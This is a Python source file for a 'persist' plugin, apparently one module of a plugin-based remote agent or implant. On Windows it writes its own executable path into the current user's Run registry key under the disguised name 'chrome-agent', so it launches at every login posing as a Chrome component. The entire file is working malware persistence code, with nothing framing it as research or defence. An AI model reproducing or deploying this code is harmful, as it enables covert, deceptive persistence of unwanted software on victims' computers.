import platform
import os
import sys
try:
    from .base import BasePlugin
except (ImportError, ValueError):
    from base import BasePlugin
from typing import Dict, Any

class PersistPlugin(BasePlugin):
    @property
    def name(self): return "persist"

    def execute(self, payload: Dict[str, Any]) -> Dict[str, Any]:
        if platform.system() != "Windows":
            return {"status": "error", "error": "Persistence only implemented for Windows"}
        
        try:
            import winreg
            # Get the path of the current executable
            exe_path = os.path.abspath(sys.executable) if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
            
            key = winreg.HKEY_CURRENT_USER
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            
            with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as reg_key:
                winreg.SetValueEx(reg_key, "chrome-agent", 0, winreg.REG_SZ, exe_path)
            
            return {"status": "success", "output": f"Persistence established in Registry: {exe_path}"}
        except Exception as e:
            return {"status": "error", "error": f"Failed to establish persistence: {str(e)}"}
